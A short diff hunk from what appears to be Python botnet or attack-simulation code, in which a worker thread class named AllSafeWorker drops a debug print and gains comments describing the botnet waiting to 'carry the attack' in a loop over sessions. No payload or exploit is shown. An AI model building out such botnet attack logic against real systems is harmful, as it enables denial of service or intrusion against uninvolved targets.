@@ -103,8 +103,9 @@ class AllSafeWorker(Thread):
         """
         # check if the attack can be carried on
         greenlight = self.carryAttack()
-        print("I AM WORKER: ", self.getWorkerTarget, "greenlight: " + greenlight)
 
+        # the botnet awaits until it can carry the attack at least once
+        # (aggressive behaviour)
         while self._sessions > 0:
             if greenlight:
                 # performing the attack
